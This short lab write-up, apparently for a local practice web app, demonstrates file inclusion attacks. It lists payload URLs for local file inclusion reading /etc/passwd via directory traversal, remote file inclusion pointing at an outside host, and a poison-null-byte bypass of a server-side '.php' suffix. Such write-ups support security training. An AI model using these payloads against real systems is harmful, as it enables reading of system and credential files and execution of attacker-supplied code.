### LFI

`http://localhost:31337/fileincl/example1.php?page=../../../../../../../../etc/passwd`

### RFI

`http://localhost:31337/fileincl/example1.php?page=http://jxn.io`

This challenge is the same, but instead of requesting `intro.php`, the `.php` is added serverside. The intention is that you should only be able to request a PHP file, but you can get around this like so:

`http://localhost:31337/fileincl/example1.php?page=../../../../../../../../etc/passwd%00`

This is known as the [poison null byte](http://hakipedia.com/index.php/Poison_Null_Byte)
